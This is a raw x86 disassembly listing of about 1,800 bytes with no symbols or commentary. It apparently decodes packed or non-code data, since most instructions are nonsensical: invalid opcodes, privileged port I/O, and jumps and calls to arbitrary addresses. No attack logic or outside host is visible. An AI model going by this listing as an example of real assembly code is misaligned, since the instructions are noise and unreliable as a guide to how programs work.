  41e398:	mov    al,0x7a
  41e39a:	call   0xfc2332eb
  41e39f:	add    BYTE PTR [edi+0x69ff52d0],bl
  41e3a5:	mov    cl,BYTE PTR [ecx-0x18321fbb]
  41e3ab:	xchg   ecx,eax
  41e3ac:	push   ds
  41e3ad:	(bad)  
  41e3ae:	inc    DWORD PTR [ebx-0x177f78f4]
  41e3b4:	pushf  
  41e3b5:	(bad)  
  41e3b6:	dec    DWORD PTR [ecx+ebx*2-0x2f17b386]
  41e3bd:	sub    edi,ebp
  41e3bf:	dec    DWORD PTR [ecx]
  41e3c1:	mov    esi,0xfe4b850b
  41e3c6:	(bad)  
  41e3c7:	call   DWORD PTR [ecx+eax*2]
  41e3ca:	or     ecx,DWORD PTR [ebp-0x72b2c927]
  41e3d0:	leave  
  41e3d1:	jp     0x41e41f
  41e3d3:	call   0x3ebda8
  41e3d8:	fld    DWORD PTR [esi+0xb]
  41e3db:	test   esi,eax
  41e3dd:	push   es
  41e3de:	add    BYTE PTR [eax],al
  41e3e0:	out    0x3b,eax
  41e3e2:	ror    BYTE PTR [ebx-0x3e824de7],1
  41e3e8:	pop    esp
  41e3e9:	(bad)  
  41e3ea:	sti    
  41e3eb:	dec    edi
  41e3ed:	mov    dh,0xfb
  41e3ef:	test   DWORD PTR [ebp+edi*2+0x61c8383],ecx
  41e3f6:	add    BYTE PTR [edx+0x14],dh
  41e3f9:	xchg   ebp,esi
  41e3fb:	add    BYTE PTR [eax],al
  41e3fd:	add    BYTE PTR [eax],al
  41e3ff:	add    BYTE PTR [eax],al
  41e401:	adc    ebp,ebp
  41e403:	cld    
  41e404:	jbe    0x41e39b
  41e406:	sti    
  41e407:	inc    ecx
  41e408:	cld    
  41e409:	dec    esp
  41e40a:	sahf   
  41e40b:	push   ebp
  41e40c:	mov    ah,0x75
  41e40e:	imul   eax,DWORD PTR [eax],0xffffff83
  41e411:	xor    eax,0x80fd17d7
  41e416:	fwait
  41e417:	cwde   
  41e418:	push   edi
  41e419:	retf   
  41e41a:	ror    DWORD PTR [ecx-0x52113278],0x73
  41e421:	xor    ah,ah
  41e423:	pop    es
  41e424:	shr    dh,1
  41e426:	pushf  
  41e427:	dec    eax
  41e428:	inc    DWORD PTR [edx-0x32c6ff95]
  41e42e:	out    0x37,al
  41e430:	clc    
  41e431:	and    al,0x60
  41e433:	lds    esp,FWORD PTR ds:0xb1427721
  41e43a:	sbb    ebx,DWORD PTR [eax+eiz*4-0x7cff941f]
  41e441:	mov    ch,0x76
  41e443:	loope  0x41e445
  41e445:	and    bl,ah
  41e447:	fnstsw WORD PTR [edx-0x73]
  41e44a:	and    bh,BYTE PTR [edi]
  41e44c:	clc    
  41e44d:	or     ebp,DWORD PTR [edi+0x7f]
  41e450:	cld    
  41e451:	or     BYTE PTR [edi],dh
  41e453:	fdivrp st(0),st
  41e455:	inc    esi
  41e456:	sub    edi,DWORD PTR [edx+esi*2+0x69]
  41e45a:	out    0xc0,al
  41e45c:	jb     0x41e4d6
  41e45e:	mov    eax,ds:0x63e8fd35
  41e463:	cwde   
  41e464:	xor    eax,0x0
  41e469:	add    BYTE PTR [ebx+0x28],bl
  41e46c:	mov    al,BYTE PTR [edi-0x17ca8f48]
  41e472:	xchg   esi,eax
  41e473:	inc    ecx
  41e474:	xchg   esp,edi
  41e476:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e478:	test   BYTE PTR [edi+0x4d],cl
  41e47b:	push   esi
  41e47c:	dec    esp
  41e47d:	push   DWORD PTR [edx]
  41e47f:	jmp    0x41e488
  41e481:	or     eax,0x8af3fe75
  41e486:	mov    eax,0xe0e8316f
  41e48b:	add    DWORD PTR [ecx-0x59788afc],ebx
  41e491:	stc    
  41e492:	test   cl,0xd5
  41e495:	mov    DWORD PTR [ecx],eax
  41e497:	test   DWORD PTR [ebx-0x78],ecx
  41e49a:	cli    
  41e49b:	hlt    
  41e49c:	out    dx,eax
  41e49d:	jbe    0x41e4d6
  41e49f:	jle    0x41e4b7
  41e4a1:	pushf  
  41e4a2:	lahf   
  41e4a3:	mov    ah,0xe6
  41e4a5:	add    ebp,edi
  41e4a7:	(bad)  
  41e4a8:	fstp   QWORD PTR [ebx+ebp*2-0x2d77dc7b]
  41e4af:	hlt    
  41e4b0:	out    dx,eax
  41e4b1:	jbe    0x41e4ea
  41e4b3:	jle    0x41e4eb
  41e4b5:	pushf  
  41e4b6:	imul   esi,DWORD PTR [esi+eiz*8+0x25428703],0x2a
  41e4be:	dec    esp
  41e4bf:	dec    ebx
  41e4c0:	test   al,0xfc
  41e4c2:	stos   BYTE PTR es:[edi],al
  41e4c3:	aad    0x61
  41e4c5:	cwde   
  41e4c6:	cmc    
  41e4c7:	ins    DWORD PTR es:[edi],dx
  41e4c8:	fidiv  DWORD PTR [ebx+eax*2]
  41e4cb:	fstp   DWORD PTR [ecx]
  41e4cd:	mov    DWORD PTR [eax],eax
  41e4cf:	add    BYTE PTR [eax],al
  41e4d1:	add    BYTE PTR [eax],al
  41e4d3:	sub    ecx,ebx
  41e4d5:	rol    BYTE PTR [eax+eiz*1],1
  41e4d8:	in     al,dx
  41e4d9:	in     eax,dx
  41e4da:	sbb    esi,DWORD PTR [ebp+0x2]
  41e4dd:	out    0x83,eax
  41e4df:	jns    0x41e4d7
  41e4e1:	bnd jl 0x41e52e
  41e4e4:	mov    bh,BYTE PTR [ebx+0x32fdf38b]
  41e4ea:	mov    DWORD PTR [edi+0x7543d8f2],eax
  41e4f0:	mov    DWORD PTR [ebx+0x1d7af58f],ebp
  41e4f6:	adc    BYTE PTR [edx+edx*8-0x2cb6c09d],al
  41e4fd:	inc    al
  41e4ff:	mov    bl,0x7f
  41e501:	add    eax,0xa8f5f280
  41e506:	mov    BYTE PTR [edi+0x13f5ff76],ah
  41e50c:	or     al,0x11
  41e50e:	test   eax,0xe57b3776
  41e513:	add    BYTE PTR [edi],0xfd
  41e516:	push   esp
  41e517:	std    
  41e518:	jle    0x41e52c
  41e51a:	gs pop es
  41e51c:	inc    eax
  41e51d:	add    BYTE PTR [eax],dl
  41e51f:	jb     0x41e59b
  41e521:	jae    0x41e513
  41e523:	std    
  41e524:	hlt    
  41e525:	idiv   DWORD PTR [esi+0x29110bdb]
  41e52b:	jns    0x41e564
  41e52d:	jnp    0x41e4e4
  41e52f:	push   0xd
  41e531:	and    DWORD PTR [eiz*8+0xf0737e],0x0
  41e53c:	std    
  41e53d:	hlt    
  41e53e:	repz xchg esi,eax
  41e540:	ror    DWORD PTR [ebx],cl
  41e542:	adc    DWORD PTR [ecx],ebp
  41e544:	jno    0x41e57a
  41e546:	shl    BYTE PTR [esi],0x5f
  41e549:	fld    st(6)
  41e54b:	stos   DWORD PTR es:[edi],eax
  41e54c:	scas   al,BYTE PTR es:[edi]
  41e54d:	jg     0x41e4d8
  41e54f:	sub    bl,BYTE PTR [ecx-0x58a2cd76]
  41e555:	aas    
  41e556:	add    BYTE PTR [eax+0x53],dh
  41e559:	push   cs
  41e55a:	aaa    
  41e55b:	fdivr  st(2),st
  41e55d:	repz add dl,BYTE PTR [esi+0x73]
  41e561:	jle    0x41e55f
  41e563:	aaa    
  41e564:	in     eax,dx
  41e565:	hlt    
  41e566:	or     ebx,DWORD PTR [esi+0x3e03eca5]
  41e56c:	jnp    0x41e5e8
  41e56e:	cld    
  41e56f:	fcomp  QWORD PTR [edx+0x11]
  41e572:	inc    eax
  41e573:	jmp    0xe33daa57
  41e578:	xor    eax,0x611ea7f3
  41e57d:	and    dl,BYTE PTR [eax+0x16]
  41e580:	jae    0x41e58c
  41e582:	call   0xfcbfd948
  41e587:	add    BYTE PTR [ebx+0x10],bh
  41e58a:	cld    
  41e58b:	mov    dl,BYTE PTR [edx+ecx*4-0x2e]
  41e58f:	mov    esp,ecx
  41e591:	jbe    0x41e5a2
  41e593:	inc    eax
  41e594:	or     al,0x4c
  41e596:	jns    0x41e590
  41e598:	mov    al,0x1
  41e59a:	sti    
  41e59b:	jne    0x41e5b1
  41e59d:	xchg   edx,edx
  41e59f:	cmp    DWORD PTR [eax],eax
  41e5a1:	add    BYTE PTR [eax],al
  41e5a3:	add    BYTE PTR [eax],al
  41e5a5:	test   eax,0x8f0b7092
  41e5aa:	or     esp,esi
  41e5ac:	push   DWORD PTR [eax+0x2075fb01]
  41e5b2:	xchg   edx,edx
  41e5b4:	mov    cl,BYTE PTR [edi]
  41e5b6:	fwait
  41e5b7:	xchg   ecx,eax
  41e5b8:	push   esi
  41e5b9:	cmp    ebx,0xffffffed
  41e5bc:	call   ecx
  41e5be:	dec    edx
  41e5bf:	push   cs
  41e5c0:	inc    eax
  41e5c1:	fdiv   st(3),st
  41e5c3:	hlt    
  41e5c4:	jmp    0x41e564
  41e5c6:	push   ebx
  41e5c7:	mov    esp,0x81a5ff40
  41e5cc:	(bad)  
  41e5cd:	mov    al,0x5d
  41e5cf:	bound  ecx,QWORD PTR [edi]
  41e5d1:	push   0xffffffbd
  41e5d3:	mov    DWORD PTR [esi-0x42],eax
  41e5d6:	sbb    al,0x7f
  41e5d8:	ror    DWORD PTR [ebp+0x36],0x66
  41e5dc:	mov    DWORD PTR [edi+eax*4-0x3d71bfef],eax
  41e5e3:	inc    DWORD PTR [edx+0x21740324]
  41e5e9:	jle    0x819a59ef
  41e5ef:	hlt    
  41e5f0:	add    ah,BYTE PTR [ecx]
  41e5f2:	add    edi,DWORD PTR [eax]
  41e5f4:	inc    esi
  41e5f5:	cmp    al,0xb
  41e5f7:	adc    bh,dh
  41e5f9:	adc    dh,BYTE PTR [edx-0x7a]
  41e5fc:	dec    esi
  41e5fd:	dec    esp
  41e5fe:	xor    ch,0x1a
  41e601:	call   0x76021446
  41e606:	mov    ah,0x22
  41e608:	ret    0x0
  41e60b:	add    BYTE PTR [eax],al
  41e60d:	add    BYTE PTR [ecx+0x6b],dh
  41e610:	jns    0x41e655
  41e612:	pop    ecx
  41e613:	ja     0x41e68c
  41e615:	dec    ebp
  41e616:	xchg   edx,esi
  41e618:	cmp    eax,DWORD PTR [eax+esi*8]
  41e61b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e61c:	in     al,0x30
  41e61e:	and    esp,DWORD PTR ds:0x6b780844
  41e624:	add    BYTE PTR [eax],al
  41e626:	dec    esi
  41e627:	lods   eax,DWORD PTR ds:[esi]
  41e628:	lsl    ebp,sp
  41e62b:	fucomi st,st(7)
  41e62d:	call   0xc7ac884
  41e632:	(bad)  
  41e633:	xor    bh,ah
  41e635:	xor    bh,al
  41e637:	add    BYTE PTR [esi-0x35327b8d],dh
  41e63d:	cs pusha 
  41e63f:	fs data16 mov WORD PTR ds:[edx],ds
  41e644:	add    dh,BYTE PTR [eax+esi*2-0x18]
  41e648:	ret    
  41e649:	add    esi,ecx
  41e64b:	test   BYTE PTR [ebx+0x4f],bh
  41e64e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41e650:	inc    eax
  41e651:	adc    al,0x74
  41e653:	imul   eax,DWORD PTR [eax],0x0
  41e656:	in     eax,0x6a
  41e658:	cdq    
  41e659:	scas   al,BYTE PTR es:[edi]
  41e65a:	dec    eax
  41e65b:	loopne 0x41e5f1
  41e65d:	adc    BYTE PTR [ecx-0x7e147c0d],0x69
  41e664:	add    BYTE PTR [eax],al
  41e666:	es mov ch,0x79
  41e669:	jb     0x41e6dc
  41e66b:	call   0xb4b70272
  41e670:	jnp    0x41e6bd
  41e672:	add    BYTE PTR [eax],al
  41e674:	add    BYTE PTR [eax],al
  41e676:	add    BYTE PTR [ecx-0x188f089],bl
  41e67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e67d:	loopne 0x41e6b9
  41e67f:	jne    0x41e6ec
  41e681:	pusha  
  41e682:	jmp    ebx
  41e684:	mov    esp,0x275ffc7
  41e689:	out    0x3,eax
  41e68b:	(bad)  
  41e68c:	jmp    0xf015:0xd191256b
  41e693:	loop   0x41e6a5
  41e695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e696:	add    eax,esp
  41e698:	jge    0x41e715
  41e69a:	sti    
  41e69b:	std    
  41e69c:	jns    0x41e709
  41e69e:	aas    
  41e69f:	pop    ecx
  41e6a0:	sbb    dl,BYTE PTR [edi-0x13ac0265]
  41e6a6:	test   edi,esi
  41e6a8:	inc    ecx
  41e6a9:	pop    edx
  41e6aa:	cmp    bh,ah
  41e6ac:	dec    esp
  41e6ad:	into   
  41e6ae:	mov    WORD PTR [esi+0x281d57c],?
  41e6b4:	pop    es
  41e6b5:	push   esp
  41e6b6:	out    0x81,al
  41e6b8:	mov    ch,0x2d
  41e6ba:	cld    
  41e6bb:	cmc    
  41e6bc:	jns    0x41e6fc
  41e6be:	adc    BYTE PTR [esi-0x7f],dh
  41e6c1:	scas   al,BYTE PTR es:[edi]
  41e6c2:	sub    al,0x66
  41e6c4:	adc    bl,BYTE PTR [eax+eax*2-0x67]
  41e6c8:	adc    dh,BYTE PTR [edi]
  41e6ca:	test   DWORD PTR [esi+0x26],eax
  41e6cd:	neg    DWORD PTR [ebx-0x7a6a8232]
  41e6d3:	int    0x11
  41e6d5:	pop    esp
  41e6d6:	inc    eax
  41e6d7:	pop    ecx
  41e6d8:	adc    dl,BYTE PTR [edi]
  41e6da:	test   DWORD PTR [eax],eax
  41e6dc:	add    BYTE PTR [eax],al
  41e6de:	add    BYTE PTR [eax],al
  41e6e0:	es xlat BYTE PTR es:[ebx]
  41e6e3:	js     0x41e69d
  41e6e5:	imul   esi,DWORD PTR [ecx-0x79],0xc4627c99
  41e6ec:	push   es
  41e6ed:	push   cs
  41e6ee:	mov    edx,0xf3263676
  41e6f3:	xor    esp,DWORD PTR ds:0x7a69f46a
  41e6f9:	jl     0x41e6a8
  41e6fb:	and    eax,0x78a20225
  41e700:	push   edi
  41e701:	fisubr WORD PTR [eax]
  41e703:	cld    
  41e704:	bound  ecx,QWORD PTR [ecx+0x435ea7ff]
  41e70a:	push   ebp
  41e70b:	(bad)  
  41e70c:	out    0x7e,al
  41e70e:	jne    0x41e6fd
  41e710:	out    dx,al
  41e711:	mov    ds:0x82f81fd0,eax
  41e716:	gs in  eax,dx
  41e718:	jbe    0x41e69b
  41e71a:	gs loope 0x41e793
  41e71d:	fadd   st(0),st
  41e71f:	jb     0x41e786
  41e721:	es add al,0x97
  41e724:	jge    0x41e776
  41e726:	pop    edi
  41e727:	sahf   
  41e728:	popf   
  41e729:	je     0x41e6b3
  41e72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e72c:	push   cs
  41e72d:	jmp    0x41e6ee
  41e72f:	dec    ecx
  41e730:	xor    dh,0x3
  41e733:	jb     0x41e73d
  41e735:	add    ecx,edi
  41e737:	jmp    0x88ec:0x5bcf3b37
  41e73e:	dec    ecx
  41e73f:	dec    ecx
  41e740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e741:	push   0xffffffb7
  41e743:	xchg   ebp,eax
  41e744:	add    BYTE PTR [eax],al
  41e746:	add    BYTE PTR [eax],al
  41e748:	add    al,bh
  41e74a:	jle    0x41e734
  41e74c:	jmp    0x41e712
  41e74e:	mov    ebx,0xd82a983
  41e753:	std    
  41e754:	ss leave 
  41e756:	mov    bh,BYTE PTR [ecx+esi*8+0x5d]
  41e75a:	jge    0x41e7bb
  41e75c:	fldenv ds:[edx-0x2f]
  41e760:	(bad)  
  41e761:	stc    
  41e762:	ficomp WORD PTR [ebp-0x55]
  41e765:	stos   BYTE PTR es:[edi],al
  41e766:	jnp    0x41e7bb
  41e768:	jb     0x41e774
  41e76a:	sub    ebx,0xffffffcd
  41e76d:	dec    eax
  41e76e:	mov    esp,0x2359547
  41e773:	push   esi
  41e774:	cs mov eax,ebx
  41e777:	shr    DWORD PTR [edx-0x1700e18a],cl
  41e77d:	jbe    0x41e7fc
  41e77f:	adc    al,BYTE PTR ds:0x3b66
  41e785:	fnstcw WORD PTR [edi]
  41e787:	or     eax,DWORD PTR [eax+edx*2+0x36000000]
  41e78e:	add    DWORD PTR [ebp+0x39],edx
  41e791:	xor    DWORD PTR [edi],esp
  41e793:	aam    0x43
  41e795:	pop    esp
  41e796:	jbe    0x41e719
  41e798:	std    
  41e799:	dec    esp
  41e79a:	(bad)  
  41e79b:	call   FWORD PTR [edi+0x3fabee]
  41e7a1:	dec    edi
  41e7a2:	mov    cl,0x38
  41e7a4:	add    DWORD PTR [ecx-0x77b362cf],ebp
  41e7aa:	ret    0x82ff
  41e7ad:	add    BYTE PTR [eax],al
  41e7af:	add    BYTE PTR [eax],al
  41e7b1:	add    BYTE PTR [edi*2+0x2fbd2371],ah
  41e7b8:	aam    0x43
  41e7ba:	sbb    al,0x3c
  41e7bc:	ret    0x575
  41e7bf:	leave  
  41e7c0:	add    DWORD PTR [eax-0x48],eax
  41e7c3:	inc    edx
  41e7c4:	cld    
  41e7c5:	add    BYTE PTR [edi-0x220780ff],dh
  41e7cb:	jb     0x41e7cd
  41e7cd:	cmp    ecx,DWORD PTR ds:0xd1886f79
  41e7d3:	rol    BYTE PTR ds:[ebx-0x24],1
  41e7d7:	jmp    0x41e840
  41e7d9:	adc    DWORD PTR [eax+ecx*1],0x71
  41e7dd:	sub    ax,0xd056
  41e7e1:	inc    ebx
  41e7e2:	int3   
  41e7e3:	cmp    eax,edx
  41e7e5:	jne    0x41e77c
  41e7e7:	enter  0x4001,0x8
  41e7eb:	inc    ebx
  41e7ec:	cld    
  41e7ed:	add    eax,DWORD PTR [edi]
  41e7ef:	pop    edx
  41e7f0:	jg     0x41e7ea
  41e7f2:	lea    edi,[ecx+0x4b]
  41e7f5:	(bad)  
  41e7f6:	cdq    
  41e7f7:	rol    BYTE PTR ds:[ebx-0x64],1
  41e7fb:	or     bh,ah
  41e7fd:	inc    esi
  41e7fe:	push   esi
  41e7ff:	lds    esi,FWORD PTR [eax+0x4]
  41e802:	jne    0x41e819
  41e804:	add    eax,0xcf8ab373
  41e809:	shl    DWORD PTR [esi+0x78f7856b],cl
  41e80f:	scas   al,BYTE PTR es:[edi]
  41e810:	adc    esi,DWORD PTR [edi]
  41e812:	push   0x40549b
  41e817:	add    BYTE PTR [eax],al
  41e819:	add    BYTE PTR [eax],al
  41e81b:	jne    0x41e7cb
  41e81d:	sub    al,0xc6
  41e81f:	jo     0x41e7cc
  41e821:	push   esp
  41e822:	inc    eax
  41e823:	jne    0x41e891
  41e825:	ins    DWORD PTR es:[edi],dx
  41e826:	and    dh,dh
  41e828:	adc    ecx,DWORD PTR [edx]
  41e82a:	jae    0x41e7bf
  41e82c:	retf   0xd3d3
  41e82f:	mov    dh,0x6b
  41e831:	cmp    eax,0x4672a8c2
  41e836:	add    dh,BYTE PTR [ebp+0x79ffc517]
  41e83c:	add    al,0x10
  41e83e:	or     DWORD PTR ds:0x3b04f76b,0xb6d3c05f
  41e848:	imul   ecx,DWORD PTR [ecx],0xffffff9f
  41e84b:	dec    ecx
  41e84c:	scas   eax,DWORD PTR es:[edi]
  41e84d:	vcvtsd2si eax,QWORD PTR [ecx-0x7f]
  41e852:	jmp    edx
  41e854:	add    al,0x4c
  41e856:	sbb    BYTE PTR [eax+edi*4-0xc42dfad],ch
  41e85d:	cmp    edi,0x86e66bca
  41e863:	jo     0x41e892
  41e865:	pop    eax
  41e866:	inc    eax
  41e867:	jne    0x41e872
  41e869:	cmp    eax,DWORD PTR [ebx]
  41e86b:	push   ecx
  41e86c:	scas   al,BYTE PTR es:[edi]
  41e86d:	(bad)  
  41e870:	push   esi
  41e871:	out    0x36,al
  41e873:	mov    BYTE PTR [ecx],bl
  41e875:	push   edi
  41e876:	inc    eax
  41e877:	jne    0x41e8ef
  41e879:	or     al,0xa0
  41e87b:	xor    DWORD PTR [esi+0xffc5],ecx
  41e881:	add    BYTE PTR [eax],al
  41e883:	add    ah,dl
  41e885:	add    ch,BYTE PTR [ebx+0x52023557]
  41e88b:	or     ebp,ebp
  41e88d:	bts    DWORD PTR [edi-0x4b],edx
  41e891:	add    bl,BYTE PTR [eax+ecx*8+0x4e]
  41e895:	rol    BYTE PTR [ebp+0x18],cl
  41e898:	mov    ecx,0xd303a714
  41e89d:	lea    ebp,[ebx-0x5b5a27a1]
  41e8a3:	push   edi
  41e8a4:	mov    ch,0x2
  41e8a6:	push   edi
  41e8a7:	add    al,0x4c
  41e8a9:	xor    eax,0x428555da
  41e8ae:	jle    0x41e8cf
  41e8b0:	xor    bh,BYTE PTR [ecx-0x1a]
  41e8b3:	jmp    0xc65cac8d
  41e8b8:	and    dl,bl
  41e8ba:	sbb    BYTE PTR ds:[ecx],0x2
  41e8be:	out    0xd9,eax
  41e8c0:	cli    
  41e8c1:	push   cs
  41e8c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c3:	push   edi
  41e8c4:	mov    ch,0x2
  41e8c6:	outs   dx,DWORD PTR ds:[esi]
  41e8c7:	pop    ss
  41e8c8:	mov    ecx,0x9304294e
  41e8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ce:	sub    al,0x58
  41e8d0:	xor    eax,0x3517ce02
  41e8d5:	adc    BYTE PTR [edi],ah
  41e8d7:	add    al,0xf4
  41e8d9:	cmp    eax,0xd7b535ea
  41e8de:	lahf   
  41e8df:	inc    ebp
  41e8e0:	push   edx
  41e8e1:	aaa    
  41e8e2:	outs   dx,DWORD PTR ds:[esi]
  41e8e3:	push   edi
  41e8e4:	xor    eax,0xf6e702
  41e8e9:	add    BYTE PTR [eax],al
  41e8eb:	add    BYTE PTR [eax],al
  41e8ed:	xchg   eax,edx
  41e8ef:	pop    esp
  41e8f0:	dec    esp
  41e8f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8f2:	(bad)  
  41e8f3:	out    0xd9,al
  41e8f5:	mov    cl,0xe
  41e8f7:	repz adc al,0x35
  41e8fa:	add    ah,BYTE PTR [edi+0x3f]
  41e8fd:	fisttp QWORD PTR [esi+0x29]
  41e900:	add    al,0x75
  41e902:	out    dx,eax
  41e903:	(bad)  
  41e904:	fstp   QWORD PTR [esi]
  41e906:	hlt    
  41e907:	std    
  41e908:	outs   dx,BYTE PTR ds:[esi]
  41e909:	hlt    
  41e90a:	test   BYTE PTR [edi+0x228364dd],bh
  41e910:	popf   
  41e911:	and    al,dl
  41e913:	(bad)  
  41e914:	call   0x34f9edd5
  41e919:	xor    BYTE PTR [eax-0x1],bh
  41e91c:	sahf   
  41e91d:	cmc    
  41e91e:	adc    al,0x18
  41e920:	fidiv  DWORD PTR [esi]
  41e922:	js     0x41e97e
  41e924:	mov    DWORD PTR [ecx],edi
  41e926:	push   esp
  41e927:	inc    eax
  41e928:	jmp    0x617ce0de
  41e92d:	stos   BYTE PTR es:[edi],al
  41e92e:	ret    0xe8ff
  41e931:	inc    ebx
  41e932:	xor    eax,0x54c15756
  41e937:	inc    eax
  41e938:	jmp    0xdd546089
  41e93d:	mov    edx,eax
  41e93f:	jmp    FWORD PTR [eax+0x5a]
  41e942:	mov    edx,0x276aad2
  41e947:	jae    0x41e91f
  41e949:	sahf   
  41e94a:	sub    dh,bh
  41e94c:	out    0xf5,al
  41e94e:	cmp    DWORD PTR [edi+0x55],0x0
  41e955:	add    BYTE PTR [edi-0x7f],ah
  41e958:	and    dl,BYTE PTR [ebp-0x17003db5]
  41e95e:	cmp    al,0x4
  41e960:	mov    eax,0xff77b99c
  41e965:	push   ss
  41e966:	hlt    
  41e967:	adc    al,0x18
  41e969:	fidiv  DWORD PTR [esi-0x4d76a589]
  41e96f:	push   ebx
  41e970:	inc    eax
  41e971:	jmp    0x8dcabdaf
  41e976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e977:	shl    BYTE PTR [eax],cl
  41e979:	mov    dl,0x6e
  41e97b:	sbb    edi,DWORD PTR [eax+0x7377b1b4]
  41e981:	add    bh,bl
  41e983:	pop    ecx
  41e984:	mov    edx,0xfc3f01c8
  41e989:	push   ebp
  41e98a:	or     edx,DWORD PTR [eax]
  41e98c:	adc    al,0x13
  41e98e:	pop    esp
  41e98f:	(bad)  
  41e990:	aaa    
  41e991:	sbb    eax,0x3fd0d4
  41e996:	mov    eax,ds:0xc9e8e819
  41e99b:	cmp    bl,0x84
  41e99e:	pushf  
  41e99f:	outs   dx,DWORD PTR ds:[esi]
  41e9a0:	or     DWORD PTR [ecx+0x43d1b759],ecx
  41e9a6:	dec    esp
  41e9a7:	leave  
  41e9a8:	add    DWORD PTR [eax+0xfc3e71],edi
  41e9ae:	loop   0x41e931
  41e9b0:	adc    DWORD PTR [eax],ebx
  41e9b2:	aas    
  41e9b3:	inc    ebx
  41e9b4:	cld    
  41e9b5:	pop    ebp
  41e9b6:	in     al,0x96
  41e9b8:	jae    0x41e9fa
  41e9ba:	add    BYTE PTR [eax],al
  41e9bc:	add    BYTE PTR [eax],al
  41e9be:	add    BYTE PTR [esp+ecx*4],bl
  41e9c1:	pop    ecx
  41e9c2:	cld    
  41e9c3:	jnp    0x41e9d5
  41e9c5:	les    edx,FWORD PTR [edx]
  41e9c7:	int3   
  41e9c8:	add    dh,BYTE PTR [edi]
  41e9ca:	ret    
  41e9cb:	mov    al,ds:0x93b8683c
  41e9d0:	inc    ebx
  41e9d1:	cld    
  41e9d2:	dec    edi
  41e9d3:	sbb    ecx,DWORD PTR ds:0xfe4c12c0
  41e9d9:	ss ret 
  41e9db:	mov    al,ds:0xc84d8925
  41e9e0:	dec    esp
  41e9e1:	or     esi,DWORD PTR [edi+0x43d154c9]
  41e9e7:	int3   
  41e9e8:	dec    ebp
  41e9e9:	or     esi,DWORD PTR [edi+0x43d156c9]
  41e9ef:	fmul   QWORD PTR [ebp-0x5]
  41e9f2:	xor    eax,0x3fda6c
  41e9f7:	sbb    edi,DWORD PTR [ecx]
  41e9f9:	dec    esp
  41e9fa:	aam    0x8f
  41e9fc:	(bad)  
  41e9fd:	cli    
  41e9fe:	shl    BYTE PTR [ebp-0x1a],1
  41ea01:	inc    ebx
  41ea02:	jb     0x41ea7a
  41ea04:	loop   0x41e9e4
  41ea06:	sti    
  41ea07:	out    dx,al
  41ea08:	and    eax,0xabac5880
  41ea0d:	(bad)  
  41ea0e:	mov    BYTE PTR [ecx+0x231b6feb],ah
  41ea14:	adc    BYTE PTR [ecx-0x7102f011],cl
  41ea1a:	inc    edx
  41ea1b:	xchg   ecx,eax
  41ea1c:	mov    eax,0x197269d2
  41ea21:	jge    0x41ea1f
  41ea23:	add    BYTE PTR [eax],al
  41ea25:	add    BYTE PTR [eax],al
  41ea27:	add    BYTE PTR [eax+0x754013ab],al
  41ea2d:	out    0x43,al
  41ea2f:	jae    0x41e9c6
  41ea31:	jmp    0x0:0x5b75f3fe
  41ea38:	ror    BYTE PTR [ebp+esi*2+0x42],0x3d
  41ea3d:	imul   eax,DWORD PTR [ebx],0x0
  41ea40:	jne    0x41e9d0
  41ea42:	or     ch,BYTE PTR [ecx]
  41ea44:	test   al,0x7
  41ea46:	mov    DWORD PTR [edx+0x25],eax
  41ea49:	push   ecx
  41ea4a:	inc    edx
  41ea4b:	jne    0x41eac6
  41ea4d:	push   eax
  41ea4e:	inc    edx
  41ea4f:	mov    BYTE PTR ds:0xb35c44f1,bl
  41ea55:	and    al,BYTE PTR [ecx+0x52]
  41ea58:	(bad)  
  41ea59:	ja     0x41e9dc
  41ea5b:	jmp    0x41eaae
  41ea5d:	xor    eax,0xa8eef631
  41ea62:	mov    esi,DWORD PTR [edx-0x13]
  41ea65:	inc    ebx
  41ea66:	test   al,0xfc
  41ea68:	jmp    0x7e6c:0x83f78144
  41ea6f:	cmc    
  41ea70:	jne    0x41eadd
  41ea72:	add    BYTE PTR [ebx+0x69d0af38],cl
  41ea78:	xor    eax,0x4f511dc1
  41ea7d:	add    ah,BYTE PTR [esi-0x8359882]
  41ea83:	ret    
  41ea84:	mov    dl,0x7e
  41ea86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea87:	push   cs
  41ea88:	icebp  
  41ea89:	push   edi
  41ea8a:	out    0x3,al
  41ea8c:	add    BYTE PTR [eax],al
  41ea8e:	add    BYTE PTR [eax],al
  41ea90:	add    BYTE PTR [ebp-0x18],dh
  41ea93:	leave  
  41ea94:	nop
  41ea95:	aaa    
  41ea96:	dec    esi
  41ea97:	adc    BYTE PTR [edx+eax*2+0x60c3db75],dl
  41ea9e:	ret    0x82e6
  41eaa1:	mov    dh,0x6
  41eaa3:	mov    ebp,0xa38758e9
  41eaa8:	push   edi
  41eaa9:	ret    0xc0d1
  41eaac:	jle    0x41eb17
  41eaae:	bt     DWORD PTR [esi*4+0x69436c02],edx
  41eab6:	jle    0x41ea40
  41eab8:	add    esi,DWORD PTR [ebp+0x2]
  41eabb:	sahf   
  41eabc:	nop
  41eabd:	iret   
  41eabe:	dec    esi
  41eabf:	xchg   esp,eax
  41eac0:	mov    bh,BYTE PTR [ecx]
  41eac2:	rcl    BYTE PTR [ecx],cl
  41eac4:	xor    esi,DWORD PTR [edx+esi*2+0x69]
  41eac8:	jge    0x41ea5a
  41eaca:	add    eax,0x752a8f6e
  41eacf:	out    0x89,al
  41ead1:	jno    0x41ea55
  41ead3:	jmp    FWORD PTR [ebx-0x5a]
  41ead6:	jmp    DWORD PTR [esi+0x7c]
  41ead9:	sbb    ch,bh
  41eadb:	jecxz  0x41ea5f
  41eadd:	add    bh,bh
  41eadf:	jae    0x41eaec
  41eae1:	in     al,dx
  41eae2:	inc    eax
  41eae3:	adc    edi,eax
  41eae5:	outs   dx,BYTE PTR ds:[esi]
  41eae6:	add    esp,DWORD PTR [esi]
  41eae8:	add    ebx,DWORD PTR [edi+0x2]
  41eaeb:	push   0x7e
